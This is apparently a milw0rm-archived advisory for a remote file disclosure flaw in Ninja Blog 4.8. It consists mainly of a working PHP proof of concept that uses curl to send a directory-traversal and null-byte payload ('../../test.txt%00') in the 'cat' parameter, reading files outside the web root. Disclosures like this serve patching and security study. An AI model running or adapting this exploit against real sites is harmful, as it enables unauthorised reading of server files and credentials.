<html><head><title>Ninja Blog 4.8 Remote Information Disclosure Vulnerability</title></head><pre>Vendor: http://ninjadesigns.co.uk
Version(s): Ninja Blog 4.8 (May also affect earlier versions)
Credit: Danny Moules
Critical: Yes

See PUSH 55 Advisory at http://www.push55.co.uk/index.php?s=ad&amp;id=6

----

Due to insufficient validation of client-side data, we can alter the path of files to be read to a file outside the intended directory.

The following PoC will read a file named 'test.txt' one level above the application folder.

---

&lt;?php

$strToRead = &quot;../../test.txt%00&quot;; //Designates 'test.txt', sat one level above the application folder, to be read
$strSite = &quot;http://www.example.com/ninjablog4.8/&quot;; //Don't forget the trailing slash

$objCurl = curl_init();
curl_setopt($objCurl, CURLOPT_URL, $strSite.&quot;entries/index.php?cat=&quot;.$strToRead);
curl_setopt($objCurl, CURLOPT_RETURNTRANSFER, true);

echo(&quot;Getting data...\n&quot;);
$strDump = curl_exec($objCurl);

curl_close($objCurl);

echo(&quot;&lt;div style=\&quot;border: solid 2px black; padding: 10px; margin: 10px;\&quot;&gt;$strDump&lt;/div&gt;\n&quot;);

?&gt;

# milw0rm.com [2009-01-19]</pre></html>